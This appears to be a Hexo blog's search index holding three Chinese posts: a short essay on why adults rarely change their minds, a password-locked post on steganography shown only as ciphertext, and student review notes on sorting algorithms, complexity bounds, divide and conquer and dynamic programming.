<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>不要试图说服别人</title>
    <url>/2020/07/14/2020-07-14-essay-1/</url>
    <content><![CDATA[<p><img src="/2020/07/14/2020-07-14-essay-1/image-20200714003508714.png" alt="image-20200714003508714"></p>
<a id="more"></a>

<h3 id="为什么永远不要试着说服别人？"><a href="#为什么永远不要试着说服别人？" class="headerlink" title="为什么永远不要试着说服别人？"></a>为什么永远不要试着说服别人？</h3><p>我认为，这句话适用于大多数成年人。</p>
<p>儿童，一张白纸，性格、为人处事仍有很大的可塑性。</p>
<p>而随着年龄递增，这张白纸的基色逐渐稳定，往后也难以改变。</p>
<p>观察几个人之后，我越发觉得这句话的正确性。</p>
<p>数十年的习惯，只言片语怎可改变？</p>
<p>再正确的道理，也抵不过思维的定势。</p>
<p>被劝说的人或是装睡，或是看不真切。</p>
<p>但都一样。毕竟那些年才是真的，他人只是路过罢了。</p>
<p>又谈何被说服呢？</p>
<p>希望自己意识到这句话之后，能多反省反省自身。</p>
<p>虽然逃不出，但能多改一点就是进步。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>信息隐藏</title>
    <url>/2020/07/08/2020-07-08-Steganography/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。</br> Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。</br> Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码。</br> Hey, password is required here." /><label>加密文章，需要输入密码。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="da7e90057b3140bbfce570b79c26e1c411175f8545d2a6d3833fc423dc4a9cde">bbbb22e1e2503541a77611f6c73ce2a791d14c3af5831a41f5885d41d28d0a95e9847b14b62edd7b2d34bc0869e04212d5bc1d6b26a00c23475adb238324666fa2b79942a78321d4d574e8542039a67d34cda85da3e6ef1049cf0e35c0f98db7b21430d9860db86c28b20e189e8eb0dc9242566f95dc4c31e6cdf7273ca8c06e50f15a05a56cc23454bdf87ac00a81d786567e30a8b738b612ed4b61e127343f51800638fa3e12e71481cf5125ec17338fd3b31fc1eaaf7035fa4367ba1eac40330407fd3dbdfa6246872b1050ffcacd4d16ef478bb4544f8b4de11fac0e0d375a8b7bf8c1d5b26f56dea7c02806a280f0ef9392746d38ec5e02e602d579083a7bc2ed9359329129f91fb72484a3df5c29b8e5994e45cf0f8c9376b82e016a92ad2d33fade256a9d8abd8ccba54e79ee1adeb016f527d9c9faa4601c02bce7d2179ed758a894f490a4cf26a5899f796fdba5312cc1567838307b1772b2ff1cf63b6d98699179ae84c14e9804817c0ca6522dc3f5bf7634d6324ef7b68e7dd2a62f6c3b001024de39b64730b8aa02c38705ce35e5aa2527799325b84f85573f49929dbbb36d7d57cc30ac046f4e739377340daabcc40c022f86eeaf0acc34ccb377ba9e5d387ec93af6b3f5d7241d51f33dce4caaa419d4d7a7e263fffd91546e300a4f6674c47de982349ed5a55b7bba1e2e99c66649ac0670e9a242dfb28b29d5891a75bc023b66382a5a1c40c24fe75d1f4a5d6808ca93bdf919d879507da802ab8e5af5c332849fda40ad2413d3070546bfa548a3a11c43ce43015b7a5f9c86dbc63140e0ad9669250dea7bafb85790a3d50e2a8557069b01351db79076a92044e19e0e879935327d4c1ab281f75b1bf033ce592f804ebe533b2282f07d8273c1f1985e15dd6fd3e48ef695f7dee477019c2530cd9db3785ec328c30c20054097091441f349bb42a1e79161a3a6598b1a69bd6b3f1faa3a9692d5354ddd75cf08dd2a27824fc9af740462f97d75bda8e5530f1ab17d5d726238f42112f5b2f962f4a49f475bc8d34f8fe5e763cf52307459938f9e7be31b354d90adee98e68dbaf073ccadbc9d1233446ff2ef894b8b22f5bcbeae24e92f475a0950909110cf4b90ef400b9e0f008a3105d0efd3261bed3c63a3280a258c49ebd87e8e58748c18efad1b5d8fc7fbab084c42cc0d3896a52897d506d6f7ac0aed3e8dc57defbd51ece420792d866234a376dc5da67a88a09541412f35c6dab7d0a3f9b70a1edd691c4fd407993f45b3cf5fe1f28b8d6043c43e5c7a2e6bcf35524081b652b6fb195eddd0d89d69096f2b0c8e1afc24a7d8f2abd5bbfea50b1f2580459fbd125f78ff6ec04c81f588a46c067cc421d8d52160b7a479248a16c15cd8d60d7b6d4ffe1d426ac1338abd4a8b030b023272d0644d854208be6f22bfb72833dd34f8236508c68d28f225ca25523981649e2cb02ca7258bbc48d96b4c4f83ce84e8f86098891c88cf7b91055ec4442b1dbf46ee26837a7a4f0a10e0993dfdb6da7ca38685ab420fd75fdcf575b4269dc542b37bdc1d5ecdedda2f6bec55af5aab0268d4024cf733a0decc7b230827816b344eaa1b5bfea26b368e309cdaffa9b2f4ab97eb4c53112ae6485c3e2fa1402d587f1a9a2f02e31f81e08b3c4fc23a57a8427c77e66af0743a97de92a1e9b06f0f39e4d0b845888d71189bc6947e4e8ed2629dd807ca01064550ae5ca1bb72d309c258168bb7d2a6b6a888fd4e987ba80bfd094dc83c467f8b3f2ecf6b4c2d19ea3c132e8e7c095dd868f846f602d14dcc90740b96c8613750593b40f51895111226faf3d466d5e111e6cd293bf0bc005d0aff3d2c6da1e8dc53a765f764fd89f6e4310b6ddc19b6be99f73a63915d92986b5b849451e30640582461addf36b76654535583c1cb2b50852872f7695660bdf8df019f4828353ae371c8bbf29895b3e2fa57d1c3fcc91ebcf7a66a4886c80c3cc0259d7a779af91fbadfbba10ee39cc50b5bd1ac36c3c40b204ed61ad0cdce5887f17f5d567f0fe01189b5c71e147985537cdf1b39356126dc975169540df65b52d4ccad5f414d60ec0bffca5d74ea8134c61069ba4e4068ea056ef249ba78032c0a745dd7cc8dbb1c8fa261265de574774b7a2afad9a8750da4c7d4a022791035ee67851de4db8c4a0fdf97484d0e72f68f4b349e201b235c47eae1f1ea1a31b7d9790b5e7546d3dfdd5f2c8151f5ac303b085618870bd96d1cf806747a18e9b41d9776ead9ebc2c2f42f0d31cace1de25fb61e2319ac890538a3bc7cf6cce29d75c2642b2881428b4ae3fe38bd53649ed55507d9055fda0194bf17d5b52244509235e1c177f3f9dfafa75a7082240c94a508364d6de11f7a42f0dc2d8df84841d148a736b31a561615167b14feceab8f30b54847ee0f3d53a0d5b59e455381dcbcdc05513dcb4493837792788fc691c9dc6aef811d93ca97097f950f87c5a2764e9789ec3cca53d69e307eb5c28ffa63d1a7ae80a53aac0760165eb5df21d2dfc72df9911eb24f35f8612628a70ff512319a5957966c3be9a0b9ac6d7bcc106750a4ddb38726fabfff9e5b36ec3d4385e58f102a7671376738791e9de18d952e7764f70d844c659c744f890983dc0800ba9abf42c890ca2b4415d193e1a062367c6d3676150e04e97918ebb3c93f53f655608598fefdb990f10f591d83e509b57aa932ed13f70dd2e494a9a5a37a5a648801840ab73e1c726f07e2fd2273f42a2fc32a94824b151cb1a3da5499b7b04ac9a727f499ebdcb42e0a035f867e766408eadac51dc734ab8c7193b857cb4d51a4a3f11671617980a42a0a5967ffd94bd7de2b613307d4ceb4c9b0a0d4bcb201747a8972b18d51977a17b4ff665c84347015900043430198f2d10e29bbf420df06b3c584bf66e41fdc2bb623c6204e2edcaee7f3182fab9823817a2ac367eb29ab3fb18a30a3f5f2077a4cd94fb361bec52c45112e282bf341f1630b8c7227b2c00e975b43d4597a927e30dc6aa7e6380d828a581d7fedb0bd87ad4b40849662d5e2d0b4b2426c8a5e6c883d1e67bbc5e90fd0ae905de742445fa94be8bfd1a058b9d1d8f3abaa872a4bd2137fbb5fa875c341d5f0a5dad19a4c669d4ee72e6787d3b78354a8a768314951180c02c2e6db730b3f8652b53cdbadbd14f1ad9c0ca174642469ae0460137e60228a87176a7ce73845f7ed3611d4641fa5ef51622b827149dcebb7bc6207e0ff6b1c090e875fe999d2590009c6ab2a25706d5265c35bdc4849d8c006555bb72be6c3e3a4c815a0cdd671aef785d1f78f10b61c3540bbe237a711d473bbcd61625ee083b03a949d5ed9d92516886861f110fb569295462f09d403927cf483adeb372490d58a7be5910b8445a28475c2460273cbec0d992cb780f07d4f8ab5484ad6e4a2fc6368821622370398c0c900fbec249c86d42fbb0e429d6c859e09f47567dea87d84815dc0ebfc18ba6cacb5323bd0a107adeed0c9ddecda50ea6840658a5fe6093f925dda9b5c9e0976ef79200198bb610cd52e7f70bddb04613a0179b1c27080fa7719b4e6405199066a6d92dee81a3dcf4b1f1d52d1a9c9cbe252158bdfbd5b1a1be968e0bfce209fa238bc404d1e29ac25bffb23d17a96e7dba3ab230a8a155f41eaa48c9d4c9a6290178ee7f2e472e1105339bf43c3f138eedb9059fddc5a608ea372d8bf276223f0e41dc5f67d3ae2e59e7faab35db2e60c103fd55e7461ae04438be9a6fe0627c2c4640f465af747ca73d91d830ab3ef7782c6fbf85f79f9dd8bbcb75167a66c3014131a79fa8e23200c99377740e43ccbc07390ea9b5902164e6ea61e42599b505de0d0bd9f0b41e3b3287ac13e7fd2f6e6048821b262996e9c9c1902789ad2348ad072c89019af1cfc0e27dcf1059cfef8c2fd4662ad747117649fcb8d9e7223900b5604ca8d4836edb051e830772b8bb3ce411aca6199eb637f15cda8cac51e9fb454d57947fed2a5a24c8ad741e6299d619247556e21e8d35d40620e4ad4f6ad54a08609859c329be4c5b10d148d89c6acb67a42aaab23a68e1147c495834d33a71133b8f1a89bdb1a6c2a557b426ac5cb7f944f1737a8f2bc5018033ecf2db12a818c9e6664ee19b248853d8df986a4b194327ab860f0a873f4879d37341a129fe4e81e92371947f4cc70f115b61a09da1ac7306c9bc3308d6f166fb8cafa441b41ac483d12f7a6ca37b8d2a690ff8d4cfb6069c38a2c54524853f6775f3d91f6d9c43f411f847c33b8056f9e674fa9a22d42f78da15f3e770ad68b06a939abe7883eda3ac33f529be6d17cc6e6feafe3b2cba46846c9541ccf668ecc20300d9e1f0b8e90d3416c07b8e673c9f01b28284a994d04825be501ebe1cfdbd95167c8682dcfac18f4feb675b9b27de07601e07f38ecde0384c6b21a6f7a6f101c21da3f7ad352540b1f7c197980915aced1b5f093dbb447080c879f707fcf3a288668e67e05ae2f6a46a430b60f7e9f1ca7fef719cfc907b1cd0b9dd68015b294f94de84c9429529d92c00beb12170ecf741b7a9f953a679d5616666d4c85dfc2fc527729ae9081db880bdddbc010701681c51b8b12cd4ae869d33810594e7963d68aa302e552916b0912872259174e72f4ead50b03f52905c77c5000db451d7fdbafd4dabdca1ada8aacde1c04fcbe39128d9271962846938e4980b718b7b44199dbc3c4a380e36b318d3ca42c66d63891f3077428592c83bf4823244048fff219a7195fa6e24e18dfe5824e472b811024248f1e445d96d2e7222cafa16e0055241e63c2f043b10f3478e4fbc0ef88bb770f418207ab95d21b270a8d50161c8dc9a78f3022ed6155ec7a16560e0378339d5fb8c656daa4b81a70720eda4bc990980bb2604422c2c86d06feae02223b189e18b199e6f4cfe0af4cec31a80e4bb249bbef313c486460f559304ee724a0cf2a3758ab1ad13aece35f9f25d9e52f7d6ca24e9feb30b189ab70725ab8cd8ab8aaaba25719e34e6fc3a4acf69968cfb7a40edb148f57e5a7205c452acbb097868c661d737faf2cab5742852fcc45ee7e470b68c73c3527fcd4d78186f07b709928af87b5d4af32f266d4bd28f0d8e6d6cc2a1692e29aff62207ac2abd728c4d3b878f3b998eb4f2bc0262d1fe4c12220fb677c01ba594b4d5f4fcfcc6a192305171c5264aae6b73d80cf3d3eee0b6086fbffb0230064edcd6493d25f4f26e88161a496d3b9c7fd8339211eb12eaabf5bf5b1a9cd802734d0f5efbea431e46625e0cef72b473d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>密文</tag>
      </tags>
  </entry>
  <entry>
    <title>算法复习</title>
    <url>/2020/07/07/2020-07-07-algorithm/</url>
    <content><![CDATA[<h1 id="概述1——排序，算法复杂度"><a href="#概述1——排序，算法复杂度" class="headerlink" title="概述1——排序，算法复杂度"></a>概述1——排序，算法复杂度</h1><h3 id="二分搜索"><a href="#二分搜索" class="headerlink" title="二分搜索"></a>二分搜索</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617203727265.png" alt="image-20200617203727265"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617203751549.png" alt="image-20200617203751549"></p>
<h3 id="合并排序-Θ-nlog-n"><a href="#合并排序-Θ-nlog-n" class="headerlink" title="合并排序  Θ(nlog^n^)"></a>合并排序  Θ(nlog^n^)</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204606235.png" alt="image-20200617204606235"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617230232234.png" alt="image-20200617230232234"></p>
<h3 id="选择排序-Θ-n-2"><a href="#选择排序-Θ-n-2" class="headerlink" title="选择排序   Θ(n^2^)"></a>选择排序   Θ(n^2^)</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204423709.png" alt="image-20200617204423709"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204456644.png" alt="image-20200617204456644"></p>
<h3 id="插入排序-Θ-n-2"><a href="#插入排序-Θ-n-2" class="headerlink" title="插入排序  Θ(n^2^)"></a>插入排序  Θ(n^2^)</h3><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204517210.png" alt="image-20200617204517210"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617204538007.png" alt="image-20200617204538007"></p>
<h2 id="O-上界-✍"><a href="#O-上界-✍" class="headerlink" title="O 上界  ✍"></a>O 上界  ✍</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205321300.png" alt="image-20200617205321300"></p>
<p><strong>不等于∞，其实就是当n趋近于无穷时，f(n)不大于cg(n)</strong></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205331994.png" alt="image-20200617205331994"></p>
<h2 id="Ω下界"><a href="#Ω下界" class="headerlink" title="Ω下界"></a>Ω下界</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205622879.png" alt="image-20200617205622879"></p>
<p><strong>不等于0，其实就是当n趋近于无穷时，f(n)仍大于cg(n)</strong></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205631847.png" alt="image-20200617205631847"></p>
<h5 id="Θ紧确界"><a href="#Θ紧确界" class="headerlink" title="Θ紧确界"></a><strong>Θ紧确界</strong></h5><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205735762.png" alt="image-20200617205735762"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205749193.png" alt="image-20200617205749193"></p>
<h5 id="o上界"><a href="#o上界" class="headerlink" title="o上界"></a><strong>o上界</strong></h5><p><strong>等于0，其实就是当n趋近于无穷时，f(n)<em>远远</em>小于cg(n)</strong></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617205905097.png" alt="image-20200617205905097"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200619124823913.png" alt="image-20200619124823913"></p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><ul>
<li>传递性</li>
<li>自反性</li>
<li>对称性</li>
<li>倒置对称性</li>
</ul>
<h1 id="概述2——算法复杂度估计"><a href="#概述2——算法复杂度估计" class="headerlink" title="概述2——算法复杂度估计"></a>概述2——算法复杂度估计</h1><p>空间复杂度不可能超过时间复杂度S(n)=O(T(n))</p>
<h2 id="数学归纳法"><a href="#数学归纳法" class="headerlink" title="数学归纳法"></a>数学归纳法</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617214000566.png" alt="image-20200617214000566"></p>
<h2 id="Master-定理Theorem"><a href="#Master-定理Theorem" class="headerlink" title="Master 定理Theorem"></a>Master 定理Theorem</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617215312663.png" alt="image-20200617215312663"></p>
<h1 id="概述3——堆、堆排序"><a href="#概述3——堆、堆排序" class="headerlink" title="概述3——堆、堆排序"></a>概述3——堆、堆排序</h1><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617215645882.png" alt="image-20200617215645882"></p>
<h2 id="比较-堆操作-——堆排序：makeH-n-delete-gt-O-nlogn"><a href="#比较-堆操作-——堆排序：makeH-n-delete-gt-O-nlogn" class="headerlink" title="(比较)堆操作 ——堆排序：makeH()+n*delete()=&gt; O(nlogn)"></a>(比较)堆操作 ——堆排序：makeH()+n*delete()=&gt; O(nlogn)</h2><ul>
<li>辅助运算Sift-up 。主要思想：就是不断的和父节点比，直到为根节点或比父节点小时停止<ul>
<li>如果比父节点大，就互相替换，继续往上比。 <strong>O(logn)</strong></li>
</ul>
</li>
<li>辅助运算Sift-down。主要思想：就是不断的和子节点比，直到为叶子节点或比子节点都大时停止<ul>
<li>如果比子节点小，就替换一个较大的子节点（左右相比），继续往下比。 <strong>O(logn)</strong></li>
</ul>
</li>
<li>insert(H,x)：插入元素x到堆H中。插入元素到堆尾，然后调用辅助运算Sift-up。 <strong>O(logn)</strong></li>
<li>delete(H,i)。删除当前元素，将堆尾元素替上来，然后辅助运算Sift-down。 <strong>O(logn)</strong></li>
<li>delete-max(H)。删除根元素。<strong>O(logn)</strong></li>
<li>make-heap(A): 从数组A创建堆。<ul>
<li>方法1：从一个空堆开始，逐步插入A中的每个元素。<strong>O(nlogn)</strong></li>
<li>方法2：遍历【n/2】-&gt;【1】，每个都要遍历Sift-down(A[i])，使以A[i]为根节点的子树调整成为堆。 <strong>O(nlogn)</strong> 比方法1略微划算一些</li>
</ul>
</li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617224058787.png" alt="image-20200617224058787"></p>
<h2 id="非比较-计数排序-——O-n-k-k-θ-n-的时候就是O-n"><a href="#非比较-计数排序-——O-n-k-k-θ-n-的时候就是O-n" class="headerlink" title="(非比较)计数排序 ——O(n+k),k=θ(n)的时候就是O(n)"></a>(非比较)计数排序 ——O(n+k),k=θ(n)的时候就是O(n)</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617221841295.png" alt="image-20200617221841295"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617221824334.png" alt="image-20200617221824334"></p>
<h2 id="非比较-基数排序-——Θ-kn-Θ-n"><a href="#非比较-基数排序-——Θ-kn-Θ-n" class="headerlink" title="(非比较)基数排序 ——Θ(kn)=Θ(n)"></a>(非比较)基数排序 ——Θ(kn)=Θ(n)</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617221323955.png" alt="image-20200617221323955"></p>
<h1 id="二、分治"><a href="#二、分治" class="headerlink" title="二、分治"></a>二、分治</h1><h2 id="合并排序算法-——O-nlogn-，加上θ-n-的空间复杂度"><a href="#合并排序算法-——O-nlogn-，加上θ-n-的空间复杂度" class="headerlink" title="合并排序算法 ——O(nlogn)，加上θ(n)的空间复杂度"></a>合并排序算法 ——O(nlogn)，加上θ(n)的空间复杂度</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Algorithm: MERGESORT(A[low…high])</span><br><span class="line">输入：待排序数组A[low,...high]</span><br><span class="line">输出：A[low…high]按非降序排列</span><br><span class="line">1. if low&lt;high then</span><br><span class="line">2.   mid←(low+high)&#x2F;2</span><br><span class="line">3.   MERGESORT(A, low, mid)</span><br><span class="line">4.   MERGESORT(A, mid+1, high)</span><br><span class="line">5.   MERGE(A, low, mid, high)</span><br><span class="line">6. end if</span><br><span class="line"></span><br><span class="line">Algorithm: MERGE(A, p, q, r):</span><br><span class="line">输入：数组A[p...q]和A[q+1...r], 各自按升序排列</span><br><span class="line">输出：将A[p...q]和A[q+1...r]合并成一个升序排序的新数组</span><br><span class="line">1. s←p; t←q+1; k←p; &#123;s, t, p 分别指向A[p...q],A[q+1...r]和B&#125;</span><br><span class="line">2. while s≤q and t≤r</span><br><span class="line">3.    if A[s] ≤A[t] then </span><br><span class="line">4.       B[k]←A[s]</span><br><span class="line">5.       s ←s+1</span><br><span class="line">6.   else</span><br><span class="line">7.       B[k]←A[t]</span><br><span class="line">8.       t←t+1</span><br><span class="line">9.   end if</span><br><span class="line">10. k←k+1</span><br><span class="line">11.end while</span><br><span class="line">12.if s&#x3D;q+1 then B[k...r] ←A[t...r]</span><br><span class="line">13.   else B[k...r] ←A[s...q]</span><br><span class="line">14. end if</span><br><span class="line">15. A[p...q] ←B[p...q]</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617230222046.png" alt="image-20200617230222046"></p>
<h2 id="分治的思想"><a href="#分治的思想" class="headerlink" title="分治的思想"></a>分治的思想</h2><ul>
<li><strong>划分</strong>：把规模较大的问题(n)分解为若干（通常为2）个<u>规模较小</u>的子问题（&lt;n）， 这些子问题<u>相互独立</u>且与<u>原问题同类</u>; (该子问题的规模减小到一定的程度就可以容易地解决)</li>
<li><strong>治理</strong>：依次求出这些子问题的解</li>
<li><strong>组合</strong>：把这些子问题的解组合起来得到原问题的解。<br>由于子问题与原问题是同类的,故分治法可以很自然地应用递归。 </li>
</ul>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200617230546415.png" alt="image-20200617230546415"></p>
<p><strong>设计模式</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">divide_and_conquer(P)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">if</span>(|P|&lt;=n0)   </span><br><span class="line">            direct_process(P);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">            divide P into smaller subinstances P1,P2,…,Pa</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=a;i++)</span><br><span class="line">                 yi=divide_and_conquer(Pi);</span><br><span class="line">            merge(y1,y2,…,ya);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="快速排序——Θ-nlogn"><a href="#快速排序——Θ-nlogn" class="headerlink" title="快速排序——Θ(nlogn)"></a>快速排序——Θ(nlogn)</h2><p>具体是</p>
<ul>
<li>选定一个中心元素之后，就要将小于他的排在其后，大于他的排在其前</li>
<li>对分开的两个数组继续如上操作，不断分治（划分、治理）。组合</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Algorithm: QUICKSORT(A[low…high])</span><br><span class="line">输入: n个元素的数组A[low…high]</span><br><span class="line">输出：按非降序排列的数组A[low…high]</span><br><span class="line"><span class="number">1.</span>  <span class="keyword">if</span> low&lt;high then</span><br><span class="line"><span class="number">2.</span>     w ← SPLIT(A[low…high])  &#123;w为基准元素A[low]的新位置&#125;</span><br><span class="line"><span class="number">3.</span>     quicksort(A, low, w<span class="number">-1</span>)</span><br><span class="line"><span class="number">4.</span>     quicksort(A, w+<span class="number">1</span>, high)</span><br><span class="line"><span class="number">5.</span>  <span class="built_in">end</span> <span class="keyword">if</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i=left;j=right;<span class="keyword">int</span> temp=a[left];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;	<span class="comment">//从右向左找第1个小于中心元素的位置j</span></span><br><span class="line">	<span class="keyword">while</span>( a[j] &gt; temp &amp;&amp; i&lt;j)       j--;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;j)</span><br><span class="line">	&#123;	a[  i ]   =    a[  j ];</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//从左向右找第1个大于中心元素的位置i</span></span><br><span class="line">	<span class="keyword">while</span>(a[i]&lt;temp &amp;&amp; i&lt;j ) 	i++;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;j)</span><br><span class="line">	&#123;	a[j]=a[i];</span><br><span class="line">		j--;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&lt;j);</span><br><span class="line">a[i]=temp;  <span class="comment">//将中心元素t填入最终位置</span></span><br><span class="line">w=i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//快速排序 </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> leftIndex, <span class="keyword">int</span> rightIndex)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (leftIndex &gt;= rightIndex) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">int</span> left = leftIndex; </span><br><span class="line">    <span class="keyword">int</span> right = rightIndex; </span><br><span class="line">    <span class="keyword">int</span> key = arr[left]; <span class="comment">//待排序的第一个元素作为基准值 </span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;<span class="comment">//从左右两边交替扫描，直到left = right </span></span><br><span class="line">        <span class="keyword">while</span> (right &gt; left &amp;&amp; arr[right] &gt;= key)  &#123; </span><br><span class="line">            right--;<span class="comment">//从右往左扫描，找到第一个比基准值小的元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        arr[left] = arr[right];<span class="comment">//找到这种元素将arr[right]放入arr[left]中 </span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[left] &lt;= key) &#123; </span><br><span class="line">            left++;<span class="comment">//从左往右扫描，找到第一个比基准值大的元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        arr[right] = arr[left];<span class="comment">//找到这种元素将arr[left]放入arr[right]中 </span></span><br><span class="line">    &#125;</span><br><span class="line">    arr[left] = key;<span class="comment">//基准值归位 </span></span><br><span class="line">    quickSort(arr, leftIndex, left - <span class="number">1</span>);<span class="comment">//对基准值左边的元素进行递归排序 </span></span><br><span class="line">    quickSort(arr, right + <span class="number">1</span>, rightIndex);<span class="comment">//对基准值右边的元素进行递归排序。 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h2><p>设A,B是两个n×n的矩阵，求C=AB.</p>
<ul>
<li><p>方法1: 直接相乘法   O(n^3)</p>
</li>
<li><p>方法2: 分块矩阵法(直接应用分治策略)   O(n^3)</p>
</li>
<li><p>方法3: Strassen算法(改进的分治策略)    O(n^log^2^7^)=O(n^2.81) </p>
</li>
</ul>
<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
<li><p>排列问题</p>
<ul>
<li>已知集合R={r1, r2,…, rn}，请设计一个算法生成集合R 中n 个元素的全排列</li>
<li>很简单，分治递归就好了</li>
</ul>
</li>
<li><p>寻找中项和第k小元素  Tn=Θ(n)</p>
<ul>
<li><p>寻找中项是寻找第k小元素的一个特列。如果能解决寻找第k小元素的问题，那么当k= ⎡ n/2 ⎤时，解决的就是寻找中项问题。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618000823253.png" alt="image-20200618000823253"></p>
</li>
</ul>
</li>
<li><p>最接近点对问题</p>
<ul>
<li><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001135406.png" alt="image-20200618001135406"></p>
</li>
<li><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001105447.png" alt="image-20200618001105447"></p>
</li>
<li><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001121031.png" alt="image-20200618001121031"></p>
</li>
</ul>
</li>
<li><p>棋盘覆盖问题</p>
<ul>
<li><p>在一个2k×2k 个方格组成的棋盘中，恰有一个方格与其他方格不同，称该方格为一<strong>特殊方格**</strong>(<strong>红色表示</strong>)**，且称该棋盘为一特殊棋盘。在棋盘覆盖问题中，要用图示的4种不同形态的L型骨牌覆盖给定的特殊棋盘上除特殊方格以外的所有方格，且任何2个L型骨牌不得重叠覆盖。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001000290.png" alt="image-20200618001000290"></p>
</li>
</ul>
</li>
</ul>
<h1 id="二、动态规划"><a href="#二、动态规划" class="headerlink" title="二、动态规划"></a>二、动态规划</h1><p>借助于变量存储中间计算结果，消除重复计算。</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618001324885.png" alt="image-20200618001324885"></p>
<p>基本思想</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002627455.png" alt="image-20200618002627455"></p>
<p>动态规划基本步骤</p>
<ul>
<li><p>找出最优解的性质，并刻划其结构特征。</p>
</li>
<li><p>递归地定义最优值。</p>
</li>
<li><p>以<strong>自底向上</strong>的方式计算出最优值。</p>
</li>
<li><p>根据计算最优值时得到的信息，构造最优解。</p>
</li>
</ul>
<h2 id="矩阵链相乘-——Θ-n-3"><a href="#矩阵链相乘-——Θ-n-3" class="headerlink" title="矩阵链相乘  ——Θ(n^3^)"></a>矩阵链相乘  ——Θ(n^3^)</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002116437.png" alt="image-20200618002116437">    可以递归地定义C[i,j]为：</p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002153871.png" alt="image-20200618002153871"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002229245.png" alt="image-20200618002229245"></p>
<h2 id="0-1背包问题-✍"><a href="#0-1背包问题-✍" class="headerlink" title="0-1背包问题  ✍"></a>0-1背包问题  ✍</h2><p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002737940.png" alt="image-20200618002737940"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002710822.png" alt="image-20200618002710822"></p>
<p><img src="/2020/07/07/2020-07-07-algorithm/image-20200618002851946.png" alt="image-20200618002851946"></p>
<p>可是一维数组又会导致，前面更新的值，影响后面的值</p>
